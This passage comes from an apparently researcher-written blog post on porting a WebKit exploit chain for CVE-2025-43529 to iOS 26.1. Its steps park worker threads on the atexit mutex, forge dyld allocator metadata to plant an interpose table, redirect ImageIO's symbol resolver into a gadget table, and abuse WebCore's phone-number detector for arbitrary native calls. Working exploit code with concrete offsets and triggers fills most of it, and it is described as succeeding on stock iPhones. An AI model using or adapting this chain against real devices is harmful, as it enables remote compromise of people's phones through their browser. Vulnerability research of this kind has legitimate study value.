That does not work on 26.1. The kernel tracks who is waiting, and our own writes to the word overwrite the userspace count anyway. The check reported "NOT seen" every single time, so the wake usually fired before worker1 had parked and was wasted.

What does work is looking at worker1's stack. If it is blocked inside `__cxa_atexit`, then the return address into `__cxa_atexit` must be sitting on that stack:

```javascript
const __cxa = offsets.libsystem_c__cxa_atexit + 0x28n
// LOW 5 BYTES only: the stack holds the PAC-SIGNED LR (lldb saw 0x1136000198ebcbc8).
// The high 3 bytes are the PAC field; bytes 0-4 are real address bits (byte 4 = 0x01 is
// address bit 32, below the VA cutoff, so it survives signing). 5 bytes kills the
// 4-byte collision risk. An 8-byte needle would never match at all.
const __nu = [
  /* bytes 0..4 of __cxa */
]

let parked = false
for (let probe = 0; probe < 4000; probe++) {
  if (p.search_once(stack_top, stack_bottom, __nu) !== 0n) {
    parked = true
    break
  }
  if ((probe & 0x1f) === 0) await spinYieldCool(probe)
}
```

Searching for the low 5 bytes of a signed pointer is a small trick worth stealing: it lets you recognise a return address without being able to verify its signature.

Parking a worker on the held atexit mutex

chain workerhas read64 / write64

doingtrigger the load

worker1the one we sacrifice

doing+initialize

\__cxa_atexit mutex

word0x102

meaningheld + 1 waiter

worker1's stack

dlopen_from framenot built yet

return addr into \__cxa_atexitabsent

close()

02/07The page tells worker1 to close() its bitmap, so +initialize runs on worker1.

## Step 7 - Three locks

Once worker1 is frozen, editing its stack is easy. Waking it up again is not, and this is where most of the porting time went.

To wake worker1 we have to get some other thread to call `__cxa_atexit` and release the mutex. The simplest way is to load another framework, since loading runs initializers and initializers register destructors. But that second load runs into locks that worker1 is still holding, and 26.1 checks those locks in a way 18.6 did not.

There are three of them, and each one needs a different answer.

### Lock 1 - dyld's dlopen lock

Our wake load calls `dlopen`, and dyld's `dlopen` path calls `releaseDlopenLockInForkParent`, which unlocks a lock that worker1's own in-progress `dlopen` is still associated with. So one thread locks it and a different thread unlocks it. On 26.1 `os_unfair_lock_unlock` **crashes the process** when that happens. On 18.6 it did not.

Our first instinct was to ask "how do we make this unlock legal", which leads straight into trying to forge the lock owner - a PAC problem. The better question was "what decides whether this lock gets touched at all". Disassembling both routines answered it:

```javascript
takeDlopenLockBeforeFork      @0x18015335c :  mov x8,x0 ; ldr x0,[x0] ; cbz x0, ret ; ...
releaseDlopenLockInForkParent @0x180156ee0 :  mov x8,x0 ; ldr x0,[x0] ; cbz x0, ret ; ...
```

Both start by loading a pointer from `RuntimeLocks + 0` and returning immediately if it is zero. That pointer is a **guard**: if it is null, dyld skips the lock entirely. It is set once when dyld starts up and never written again, so if we zero it, it stays zero.

```javascript
RuntimeStateLock_word: 0x0n // the GUARD at +0, NOT the lock word at +0x20
```

With the guard zeroed, both routines return straight away. The lock is never taken, so it is never unlocked, so there is nothing to crash on.

Worth recording the mistake right next to it. The actual lock lives at `+0x20`, and zeroing *that* instead leaves the guard in place. dyld then runs the unlock as normal, on a lock whose value we just set to 0, and the process dies with `EXC_BREAKPOINT`. We read that crash for a while as 26.1 blocking the technique. It was our own write, eight bytes off. When a crash that looks like a security check keeps reproducing on a value you wrote yourself, check your offset before you blame the platform.

### Lock 2 - the bundle lock, and thread tokens

`-[NSBundle loadAndReturnError:]` also takes a lock: an `os_unfair_lock` sitting inside the bundle object at `+0x40`. We'll call it `TT._lock`. Every path out of that function unlocks it, and unlike dyld's there is no guard to switch off.

worker1 parked *inside* that function, so as far as the lock is concerned worker1 is the owner. If the thread doing our wake also loads through TextToSpeech, it takes the same lock, and one of the two unlocks comes from the wrong thread. Crash again.

Here the fix comes from what the lock stores. On 26.1 an `os_unfair_lock` holds the **mach thread port** of whichever thread owns it (the bottom bits are used as flags). So the ownership check is comparing against a plain number - and we collected exactly those numbers for every worker back in Step 4. A number we can read is a number we can write:

```javascript
const w1tok = BigInt(worker.threadPort)
const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock
p.write32le(lockAddr, w1tok) // worker1's own pending unlock is now legal, whenever it fires
```

We cannot make a thread unlock legally, so instead we **write the owner it expects into the lock beforehand**. Each token we collected is a key cut in advance, for a lock some other thread is going to open later.

That takes care of worker1. The remaining problem is the wake thread, which should not touch this lock at all.

The way out was found by GenericCoding, and it is one of the nicest parts of the chain. `+[NSBundle bundleWithPath:]` does not go straight to the filesystem - it first checks a cache of paths it has already resolved. That cache is an **`NSMapTable`** at `NSBundleTables + 0x28`, called `_resolvedPathToBundles`.

`NSMapTable` is the raw-pointer version of `NSDictionary`. It exists so you can build caches that hold weak or unretained pointers, and it stores its entries as **plain arrays of key and value pointers**. That detail decides everything here. Changing an entry in an `NSMutableDictionary` means calling `setObject:forKey:`, and calling an Objective-C method is exactly the thing we do not have yet. Changing a value in an `NSMapTable` is one `write64`.

We had written this route off earlier as "blocked, needs a native call", because we assumed the cache was a dictionary. It never was. Checking what the container actually was would have saved us about two weeks:

```javascript
function tableMapInfo() {
  const tables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value)
  const map = p.read64(tables + 0x28n)
  return {
    map,
    count: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_countOff))),
    keys: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_keysOff))),
    values: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_valuesOff))),
  }
}

// Find TextToSpeech by VALUE (we already know its pointer, so no string reads),
// and pick any other loaded bundle that still owns a CFBundle as the stand-in.
if (v === p.TextToSpeech_NSBundle) {
  ttSlot = values + i * 8n
  ttOrig = v
} else if (!borrow && v > 0x100000000n && p.read64(v + structs.NSBundle_cfBundle) !== 0n) {
  borrow = v
}
```

Then the decouple is two writes around the fire:

```javascript
p.write64(mr.slot, mr.borrow) // the TextToSpeech path now resolves to a different bundle
/* ... fire the wake load ... */
p.write64(mr.slot, mr.orig) // put it back
```

Now the wake load resolves to the borrowed bundle and takes **its** lock, which nobody is holding. `TT._lock` stays owned by worker1 the whole time. The two threads never share a lock, so no unlock ever comes from the wrong thread, and the check has nothing to fire on.

```javascript
  before                                   during the fire
  _resolvedPathToBundles                   _resolvedPathToBundles
  +-------------------+------------+       +-------------------+------------+
  | ".../TextToSpeech"| -> TT      |       | ".../TextToSpeech"| -> borrow  |
  | ".../SomeOtherFW" | -> borrow  |       | ".../SomeOtherFW" | -> borrow  |
  +-------------------+------------+       +-------------------+------------+
        worker1 owns TT._lock                    wake takes borrow._lock
```

### Lock 3 - the dispatch_once gate

The deferred loader runs inside a `dispatch_once`, so there is a third piece of state to get right. On 26.1, when a `dispatch_once` block finishes, libdispatch checks that the thread finishing it is the thread that claimed it. If not, `brk`.

That is harder than it sounds, because we do not control when those blocks finish. A block that ends up waiting on a system service can finish seconds later, long after we have moved on.

The fix has the same shape as the bundle lock: write the port of whichever thread we expect to finish the block into the token, before we do anything that might let it finish.

```javascript
// write, re-link read64, read back, retry - write64's split path silently fails under
// the concurrent load the fire creates, and a seed that didn't land is a guaranteed brk.
seedTokenVerify(BigInt(tok) & ~3n, 'ARM w1tok')
```

This is also why we spawn **spare workers** and let them run the `dispatch_once` block instead of running it on the chain thread. Each wake fire uses its own spare (`0x33333333` for worker1, `0x44444444` for worker2), so the blocks whose completion we have to account for are the two parked workers' gates plus each spare's own early-return - and we seed the right port into the token before each one can finish.

## Step 8 - The wake and the write

Now we can assemble the whole thing. We have two parked workers and two fields to land: the interpose table needs a buffer pointer *and* a count, and each parked worker's `dlopen_from` epilogue hands us exactly **one** write. So we park two workers and wake them one at a time - worker1 for the buffer at `RS+0xb8`, worker2 for the count at `RS+0xc0`.

### The wake: fireWorkerWake

Waking a parked worker means getting some other thread to perform a real `__cxa_atexit` release while the mutex advertises `count > gen`. The chain does this with the same `NSMapTable` trick that decoupled Lock 2 in Step 7, wrapped in a single entry point:

```javascript
async function fireWorkerWake(path, tok) {
  // swap the TextToSpeech slot to a borrowed bundle, plant a fresh AVSpeech class
  // on a spare worker's bitmap, fire that spare -> it dlopens `path` for us
  return await wakeViaMapRedirect(path, tok)
}
```

The fire does five things in order. First we swap the `TextToSpeech` entry in `_resolvedPathToBundles` so it resolves to the borrowed bundle instead of the real one - the same map swap that kept `TT._lock` out of the wake thread's hands in Step 7. Then we re-arm the borrowed bundle's `CFBundle`: its `execPath` now points at our forged `CFString`, and its loaded-flags are cleared so CoreFoundation will load it again. Then we plant a **fresh** `AVSpeechSynthesis*` class on a **spare worker's** bitmap. The page closes that bitmap, the spare's `+initialize` runs the AVLoadSpeech loader, and the loader `dlopen` s the wake path through the borrowed bundle. The path's static C++ destructors register through `__cxa_atexit`; that release is the drop that wakes the parked worker. Its `dlopen_from` epilogue then runs, and its one `free()` writes the field we forged.

Why a fresh class and a fresh spare, every time. `+initialize` runs once per class ever, and a spare's `ImageBitmap` is consumed by its first `close()`. A spent spare can never re-fire. So each wake draws a fresh class out of the AVSpeech pool and its own spare worker - `0x33333333` for worker1's fire, `0x44444444` for worker2's.

fireWorkerWake: the mapredir fire that wakes a parked worker

chain workerhas read64 / write64

doingidle

\_resolvedPathToBundlesNSMapTable

TextToSpeech ->TextToSpeech -> borrow

spare workerfresh bitmap + fresh class

doingidle

parked workerthe one being woken

doingparked

\__cxa_atexit mutex

statearmed

RuntimeState (RS)

+0xb8 tuples bufferdyld internal

+0xc0 tuples count0x9

01/06The chain swaps the TextToSpeech slot so it resolves to a borrowed bundle.

### worker1's leg: the buffer

Finding the frame is a stack scan for a return address inside dyld's `dlopen_from`, using the same low-bytes-of-a-signed-pointer trick as the park check. Once we have that address we know where the frame is, and the one vector slot the cleanup code at the end of `dlopen` actually frees sits at a fixed offset from it:

```javascript
// The epilogue's cleanup free() consumes x19+0x70 ONLY (needle = saved lr at x19+0x888).
const vecSlot = search_result - 0x818n // = x19+0x70

// worker1's leg -> BUFFER, RS+0xb8
p.write64(vecSlot, p_InterposeTupleAll_buffer - 0x10n) // .allocator = dest - 0x10
p.write64(vecSlot + 8n, metadata_data_ptr + 0x10n) // .begin = forged metadata
p.write64(vecSlot + 0x10n, 0n) // .size = 0 -> the copy step is a no-op
```

### worker2's leg: the count

The count at `RS+0xc0` cannot come from the same frame - worker1's epilogue only frees its own one vector, and once worker1 is woken its frame is gone. So we park a second worker and repeat the whole dance. On worker2's frozen frame we forge the same slot, aimed at the count instead:

```javascript
// worker2's leg -> COUNT, RS+0xc0 (same slot, on worker2's frame)
const vecSlot2 = search_result2 - 0x818n // = worker2's x19+0x70
p.write64(vecSlot2, p_InterposeTupleAll_size - 0x10n) // .allocator = dest - 0x10
p.write64(vecSlot2 + 8n, metadata2_data_ptr + 0x10n) // .begin = forged metadata
p.write64(vecSlot2 + 0x10n, 0n) // .size = 0 -> the copy step is a no-op
```

`_allocatedBytes` sits at `allocator + 0x10`, so setting `.allocator = dest - 0x10` puts the write exactly on the field we want - once for worker1's buffer, once for worker2's count.

Worth noting how DarkSword did this. Each parked thread hands you one `dlopen` to hijack, so DarkSword used one parked thread per field: one for the buffer pointer, another for the count. We do exactly the same - the only difference is that in our build each parked worker's epilogue frees one vector, so the two writes genuinely need two parked workers.

An earlier version wrote to a different slot on the same frame and gave us the most confusing result of the whole project: worker1 woke up, unlocked cleanly, and stored nothing at all. That slot simply never gets freed. If something like this appears to work but has no effect, check that the code you are relying on really does read the field you edited.

Now the metadata header, which is the fiddly part. `free()` does more than the subtraction we care about. It also walks a list of chunks looking for the owner, and then tail-calls an `insert` routine that tries to merge the freed chunk with its neighbour. That merge does a write we have no control over, so it has to be prevented rather than aimed.

The header therefore has to do three jobs at once: make the subtraction land where we want, stop the merge write from happening, and stop the owner walk from running off into nothing.

```javascript
// (1) OWNER WALK: point the chunk at a second header that ends the walk immediately.
//     Bit 0 set is what tells the walk to stop. A plain self-link loops forever,
//     and a zero link gives a null owner and freezes the process.
prev_metadata[0] = prev_metadata_data_ptr | 1n
prev_metadata[1] = 1n

const oldBuf = p.read64(p_InterposeTupleAll_buffer) // what the field holds right now
const noTable = !(oldBuf > 0x100000000n && oldBuf < 0x210000000n)

let attackerBuf, metadata_addr, metadata1_size

if (noTable) {
  // (2a) NOTHING IN THE FIELD YET. Size 1 means "size & ~3 == 0", and with that
  //      the merge routine takes its early-exit branch and never writes at all.
  //      Fully deterministic - nothing depends on how memory happens to be laid out.
  attackerBuf = interposingTuples_data_ptr + 0x10n
  metadata_addr = interposingTuples_data_ptr // = attackerBuf - 0x10
  metadata1_size = 1n
} else {
  // (2b) THE FIELD ALREADY HOLDS A TABLE. Now the old value is part of the sum, so
  //      the size has to cancel it out. The merge routine still runs, and it only
  //      skips its write when the qword it looks at is odd - so find an offset K
  //      where that is true. Reads only, which TPRO allows.
  attackerBuf = interposingTuples_data_ptr
  const pageLeft = 0x4000n - (oldBuf & 0x3fffn) - 0x20n
  const kMax = pageLeft < 0x2700n ? pageLeft : 0x2700n
  let K = 0n
  for (let k = 0x100n; k < kMax; k += 8n) {
    if ((p.read64(oldBuf + k + 0x18n) & 1n) === 1n) {
      K = k
      break
    }
  }
  metadata_addr = interposingTuples_data_ptr + K
  metadata1_size = (oldBuf + K + 0x10n) | 3n
}

// (3) write the forged header just in front of the buffer free() will be handed
p.write64(metadata_addr + 0n, p.prev_metadata_data_ptr) // owner link
p.write64(metadata_addr + 8n, metadata1_size) // size field
```

The allocator is never confused by any of this. It runs its normal algorithm and gets the normal answer - the header it is reading just happens to be one we wrote. The single step we cannot aim is turned off instead of redirected.

The fire is only as good as its vehicle, and this is where a detail bit us that we haven't seen written down anywhere: **loading a fresh framework is not sufficient**.

`__cxa_atexit` is only called by images that construct objects with **static storage duration**. A framework whose initializers are pure Objective-C or plain C loads perfectly, bumps dyld's image count, and registers nothing - so there's no release, no drop, and nobody wakes. We watched `Proximity.framework` load successfully and produce zero wakes, repeatedly, before working out why:

```javascript
// Needs a vehicle whose initializers have STATIC C++ DESTRUCTORS - that is what
// __cxa_atexit actually registers at runtime.
//   Proximity (1-2 inits): loaded 1100->1101 but GEN TIMEOUT every attempt.
//                          ObjC/C-only inits -> no cxa registration -> no drop.
//   TextInput bundles:     resource-only, no executable at all.
//   MacinTalk:             3 ObjC-only inits, loads fresh but registers nothing.
//   XOJIT:                 ~71 real cxa registrations, not resident. worker1's fire.
//   HomeUI:                fresh, never resident. worker2's fire.
const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT'
const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI'
```

The selection criterion for a wake vehicle is a C++ property of the target binary. That's a strange thing to have to care about, and it's the kind of detail that only shows up when you instrument the thing you assumed was working. The two fires can even use different vehicles - worker1 fires XOJIT for the buffer, worker2 fires HomeUI for the count - as long as each one is fresh and registers real destructors.

Two wakes, two writes: worker1 lands the buffer, worker2 lands the count

worker1 x19+0x70

buffer leg

.allocator = RS+0xb8-0x10

worker2 x19+0x70

count leg

real dyld allocator

atexit mutex word

count vs generation

0x01

spare 1 (0x33333333)

fires XOJIT

spare 2 (0x44444444)

fires HomeUI

RuntimeState +0xb8

interposingTuplesAll buffer

dyld internal

RuntimeState +0xc0

interposingTuplesAll count

0x9

02/08Forge worker1's Vector on its frozen stack: aim \_allocatedBytes at RS+0xb8.

## Step 9 - From table to gadgets

The table is live. Now we need it to hand us something callable.

The eight tuples the chain installs are these, and the first one is the pivot:

```javascript
interpose(MACaptionAppearanceGetTextEdgeStyle, IIOLoadCMPhotoSymbols) // the pivot
interpose(kCMPhotoTranscodeOption_Strips, 0n)
interpose(CMPhotoCompressionCreateContainerFromImageExt, libGPUCompilerImplLazy__invoker)
interpose(CMPhotoCompressionCreateDataContainerFromImage, SecKeychainBackupSyncable_block_invoke)
interpose(CMPhotoCompressionSessionAddAuxiliaryImage, SecOTRSessionProcessPacketRemote_block_invoke)
interpose(CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, libdyld__dlopen)
interpose(CMPhotoCompressionSessionAddCustomMetadata, libdyld__dlsym)
interpose(CMPhotoCompressionSessionAddExif, dyld__signPointer)
```

A word on how many tuples dyld thinks there are. The count our `free()` writes is not a number we get to pick freely - it comes out as whatever was already in the field plus `0x100`. On this device the field started at `0x9`, so dyld ends up walking `0x109` entries while only eight of them are ours.

That is fine, and it is why the array is allocated larger than the count:

```javascript
// 0x140 entries, not 0x100: the field already held 9, so the store lands 0x109 and
// dyld would otherwise walk 9 entries past the end of a 0x100-entry array.
// The spare entries are zero, and Loader::interpose never matches replacee == 0.
const interposingTuples = new BigUint64Array(0x140 * 2)
```

Zero tuples are inert, so over-allocating costs nothing and removes the need to predict the count exactly.

`IIOLoadCMPhotoSymbols` is ImageIO's **lazy symbol resolver** for the CMPhoto codec. Its designed job is to `dlopen` CMPhoto and `dlsym` each entry point into a table of `gFunc` globals, so ImageIO can call them later without linking against the framework.

`MACaptionAppearanceGetTextEdgeStyle` is a MediaAccessibility function that reports the user's caption text-edge preference, and WebCore calls it when it builds the caption stylesheet.

Put the two together through the interpose table and something quite nice happens. WebCore calls what it believes is a preferences getter, and actually runs ImageIO's symbol resolver. The resolver then does its own job perfectly - it resolves every CMPhoto symbol and writes the results into the `gFunc` globals. But the table also redirects every one of *those* symbols. So the globals end up holding the invoker thunk, two Security block-invoke thunks, `dlopen`, `dlsym` and `signPointer`.

**We never write the gadget table.** We arrange for Apple's own resolver to write our function pointers into it, correctly signed, because from dyld's perspective nothing unusual happened.

Triggering it from the page is a caption track and a forced layout:

```javascript
const cv = document.createElement('video')
cv.muted = true
cv.playsInline = true
const t = cv.addTextTrack('captions', 'English', 'en')
t.addCue(new VTTCue(0, 3600, 'wake'))
document.body.appendChild(cv)
t.mode = 'showing'
void cv.offsetHeight // force style/layout so caption prefs resolve now
```

No `src`, and deliberately no `play()`. A playing video re-invokes the interposed getter every frame, and since that getter is now a full `dlopen` + `dlsym` loop, the main thread pegs and the whole chain starves. The carrier is torn down immediately after the globals resolve, for the same reason.

## Step 10 - slow_fcall

We have gadget addresses sitting in globals. What we still don't have is a way to **call** one with arguments of our choosing. The chain's answer is `TelephoneNumberDetector`, and it is one of the most beautiful pieces of the whole thing.

### What a call actually needs

To make a useful call on arm64 we need three things:

1.  **`pc`** - the address to jump to
2.  **`x0`, `x1`, `x2`** - the first three argument registers
3.  **the return value back in JavaScript**

PAC makes the first one hard. We cannot invent a `pc`, because the CPU authenticates function pointers before branching to them. But notice what we already have: `dlopen`, `dlsym` and the invoker thunk were written into the `gFunc` globals **by `dlsym` itself**. Those are genuine pointers, signed by dyld with the normal scheme. We never need to forge a signature - we only need to move an already-signed pointer to somewhere it will get called.

The instruction that calls it matters too. The gadget branches with `blraaz`, which authenticates using the A-key with a **zero context**. `dlsym` returns pointers signed exactly that way, which is why one can be dropped into a completely different structure and still authenticate. Had the call site used a context-bound variant (`blraa` with a discriminator tied to the storage address), moving the pointer would break it.

So `pc` is solved by copying a signed pointer. That leaves the arguments, and that is what the gadget is for.

### The gadget

The pointer we put in WebCore's soft-link slot is a real Security function - a block-invoke thunk. Its normal job is boring: it is the body of an Objective-C block, so it expects its first argument to be the block object, reads captured values out of that object at fixed offsets, and calls a function pointer it fetches from a global table.

For us, those three behaviours are exactly a call primitive:

```javascript
  gadget(x0 = whatever WebCore passes as the "scanner object")

     x0      = [scanner + 0x28]        <- we choose
     x1      = [scanner + 0x30]        <- we choose
     x2      = [scanner + 0x38]        <- we choose
     pc      = gSecurityd[0x80]        <- we choose (a real signed pointer)
     blraaz  pc
     [[scanner + 0x20]] = return value <- we choose where it lands
```

Every one of those inputs is a field in memory. The block "object" is whatever WebCore hands the function as `x0` - and WebCore hands it the scanner object, which is a global pointer we control. So we point it at a buffer of our own, fill in the offsets the gadget reads, and it obligingly loads our arguments and calls our function.

The buffer is a `BigUint64Array` we own from JavaScript, which is also how the return value comes back:

```javascript
const slowFcallResult = new BigUint64Array(0x10 / 8)
const invoker_x0 = new BigUint64Array(0x58)
invoker_x0[0x20 / 8] = slowFcallResult.data() // where the gadget stores the result
invoker_x0[0x18 / 8] = invoker_x0.data() // self-pointer the thunk expects
```

### Getting WebCore to call it

Now we need WebCore to actually invoke that slot. It does so when it scans text for phone numbers, so Safari can turn them into tappable links. The scanner lives in DataDetectorsCore and is reached through a soft-linked function pointer, set up once behind a `dispatch_once` and gated by an "is Data Detectors available" flag. All three are just memory:

```javascript
// Tell WebCore that Data Detectors exists and is already initialized, and hand it a
// "scanner object" that is really our argument block.
p.write8(offsets.WebCore__TND_supportedFlag, 1n)
p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn) // once = already done
p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr) // fake scanner

function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
  // point the softlink slot at a Security block-invoke gadget
  p.write64(
    offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray,
    paciza_security_invoker_1
  )
  gSecurityd[0x80 / 8] = pc // the pc the gadget will branch to
  invoker_x0[0x28 / 8] = x0 // gadget1 reads x0..x2 out of the fake scanner
  invoker_x0[0x30 / 8] = x1
  invoker_x0[0x38 / 8] = x2
  p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr) // swap in our ops table
  return new Promise((r) => {
    slow_fcall_resolve = (val) => {
      slow_fcall_resolve = null
      if (p.realGSecurityd !== 0n) p.write64(offsets.Security__gSecurityd, p.realGSecurityd)
      r(val)
    }
    self.postMessage({ type: 'slow_fcall' }) // ask the page to fire the trigger
    setTimeout(() => {
      if (slow_fcall_resolve) slow_fcall_resolve(0xdeaddeadn)
    }, 3000)
  })
}
```

### The gate that is a preference, not a check

Those three writes only matter if `find()` ever runs, and on stock hardware it does not. `find()` is reached from `processCharacterBufferForInBody` - the HTML tree builder - and 26.1 gates that one call on `Document::isTelephoneNumberParsingEnabled()`, which reads **two bytes we had never touched**: `settings().telephoneNumberParsingEnabled` and the document's `m_isTelephoneNumberParsingAllowed`.

The setting is declared `status:embedder` in `UnifiedWebPreferences.yaml`, and it **defaults to false**. HTML can reach the second byte - a `<meta name="format-detection">` tag flips `m_isTelephoneNumberParsingAllowed` - but that only helps if the first byte is already on, and the embedder preference itself is not something a web page can express. The vphone's browser opts in, so the scan fired and everything worked. A real iPhone loading the same page through a plain webview does not: the parser returns before it ever calls `find()`, the planted slot is never invoked, and the fcall sentinel survives untouched. We burned a full session on stock hardware with a correct interpose and correct gadgets before we looked here - the scan simply never ran.

The fix is to open the gate ourselves. `Settings` is shared per- `Page`, so we walk the same `allScriptExecutionContextsMap` as Step 4 and force two bytes on every `HTMLDocument`. Two details nearly stopped us. First, the map stores the **`ScriptExecutionContext` subobject**, not the `Document` - the vtable at `ctx+0` is the secondary address point (`0x1f1367550` on 23B85, the primary plus `0x370`), and `Document = ctx - 0xd0`. Second, `Settings` is a runtime heap object, not cache-resident, so the "must live in the shared cache" plausibility check kept rejecting a perfectly good `0x10b…` pointer until we widened it:

```javascript
function armTelephoneGate() {
  const tab = p.read64(offsets.WebCore__allScriptExecutionContextsMap_contexts)
  const len = p.read64(tab - 8n) >> 32n
  for (let i = 0n; i < len; ++i) {
    const ctx = p.read64(tab + i * structs.ContextsMap_stride + structs.ContextsMap_value)
    if (noPAC(p.read64(ctx)) !== offsets.WebCore__HTMLDocument_vtable) continue
    const doc = ctx - 0xd0n // the map value is the SEC subobject, Document + 0xd0
    const settings = p.read64(doc + 0x2d0n) // Document.m_settings (a heap object)
    // write8 masks into the containing 64-bit word
    p.write8(settings + 0x2d2n, (p.read64(settings + 0x2d0n) >> 16n & 0xffn) | 0x8n) // parsing enabled
    p.write8(doc + 0xe0cn, (p.read64(doc + 0xe08n) >> 32n & 0xffn) | 0x1n) // allowed
  }
}
```

The preference is re-armed before every call, not just once: any load can reset the shared settings. And it is worth saying twice that this is **not a security check** - no PAC, no policy, no entitlement behind it. It is a default-false embedder flag sitting between a renderer primitive and the code path it wants. That is exactly why "works on my device" is a dangerous sentence in browser work, and exactly why the bypass is one byte.

The gate that is a preference: forcing the parser to call find()

processCharacterBuffer

HTML tree builder

settings +0x2d2

telephoneNumberParsingEnabled, bit 3

FORCED ON (0x8)

doc +0xe0c

m_isTelephoneNumberParsingAllowed, bit 0

FORCED ON (0x1)

find()

TelephoneNumberDetector

softlink slot

our gadget

gSecurityd\[0x80\]

the call we wanted

02/04The chain forces both bytes on every HTMLDocument in the context map.

The trigger, on the main thread, is a phone-shaped number:

```javascript
iframe.contentDocument.write('<span data-mime-type="text/latex">5551234567</span>')
```

That's it. A phone number in a document is a native call - provided the tree-builder gate is open. WebCore sees text worth scanning, believes Data Detectors is ready, calls the soft-link slot and passes it the scanner object - and the slot is our gadget, and the scanner object is our argument block.

One extra bit of care: the securityd table we swap in is a **copy** of the real one, with only the single entry at `+0x80` replaced, and it is put back immediately after the call returns. Loading a fresh framework does code-signature validation, which goes through Security, so the real table has to be in place everywhere except the instant of our call.

The `data-mime-type="text/latex"` wrapper deserves its own paragraph, because it looks like superstition and isn't. After `find()` returns, 26.1's `processCharacterBufferForInBody` walks the ancestor chain looking for exactly that attribute. If it finds it, it takes the plain insert-text path, which **never reads `find()` 's out-parameters**. Without the match it takes the linkify path, reads the garbage our gadget left in those out-params, and hits `brk #1`. The attribute isn't part of the exploit - it's how we stop WebCore from inspecting results that were never real.

The chain refuses to move on until that primitive proves itself end to end:

```javascript
const __mh = await p.slow_dlopen('/usr/lib/system/libsystem_malloc.dylib', 0n)
const __ms = __mh !== 0n && __mh !== 0xdeaddeadn ? await p.slow_dlsym(__mh, 'malloc') : 0n
if ((__ms & 0xffffffffffn) - p.slide !== 0x18e532040n) {
  postMessage(
    `[stage7] fcall self-test FAILED (handle=${hex(__mh)} malloc=${hex(__ms)}) -- aborting attempt`
  )
  return false
}
postMessage(`[stage7] fcall self-test PASSED (malloc=${hex(__ms)})`)
```

Resolving `malloc` through our own `dlopen` / `dlsym` and matching it against the known unslid offset is a small thing to print, but it means arbitrary native calls inside the WebContent sandbox, from a single JavaScript bug.

![The chain running to completion on the research device (vphone): the dark console scrolls through the wake logs and the status bar settles on fcall self-test PASSED](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/64a8afa287bc27d1.jpg)

That is the whole thing on a screen. The top bar is the testbench, the dark console is the chain's own log stream (the `mapredir` fires, the interpose tuples, the caption carrier), and the green status is the fcall self-test passing end to end - every step of this post, live. The same run now reaches `PASSED` on a stock iPhone on the same build; the one wall the real device exposed that the vphone did not is the embedder preference in Step 10. The research device's configuration is a test condition, not a promise.

## The whole chain in one picture

Four threads, one loader, and a lock held at the right moment. If you read nothing else in this post, read this:

CVE-2025-43529 to arbitrary native calls - the full chain

main thread (page)

doingidle

chain workerruns the exploit

doingbuilding R/W

worker1parked, writes the buffer

doingidle

worker2parked, writes the count

doingidle

spare 1 (0x33333333)fires XOJIT for worker1

doingidle

spare 2 (0x44444444)fires HomeUI for worker2

doingidle

\__cxa_atexit mutex

word0x01 free

dyld RuntimeState + gadget globals

RS+0xb8 tuplesdyld internal

RS+0xc0 count0x9

ImageIO gFunc globalsreal CMPhoto symbols

WebCore telephone globals

parsing prefdefault OFF

softlink slotreal DataDetectors fn

scanner objectreal scanner

01/17Stage 1 - the chain worker turns the UAF into addrof/fakeobj, then read64/write64.

This is where Part 1 of this series ended. Everything below is spent from here.

## What's next

The call primitive is the foundation, not the goal - and it now runs on stock hardware as well as the research device. `slow_fcall` is slow (each call is a round trip through the page and a synthetic layout) and it runs inside the WebContent sandbox, which is deliberately a bad place to be. Part 3 is about what you build on top of it: a faster call primitive, and then the actual interesting question - getting out of the sandbox.

## Resources

-   [DarkSword](https://github.com/ghh-jb/DarkSword) - the original chain this is a port of
-   [pois0nSword](https://github.com/GenericCoding/pois0nSword) - the iOS 26.1 port. Everything described in this post lives in that repo
-   [dyld source](https://github.com/apple-oss-distributions/dyld) - `lsl/Vector.h` and the allocator
-   [dyld4::RuntimeState](https://github.com/apple-oss-distributions/dyld/blob/main/dyld/DyldRuntimeState.h#L90) - the loader state object holding `interposingTuplesAll`
-   [`_CFBundleLoadExecutableAndReturnError`](https://github.com/opensource-apple/CF/blob/master/CFBundle.c#L1935) - CoreFoundation's bundle loader, where `_isLoaded` gates the real `dlopen`
-   [Part 1 - From One OOB to Cage-Free Arbitrary R/W](https://varik.dev/blog/jsc/jsc-exploitation-primitives-part-1)
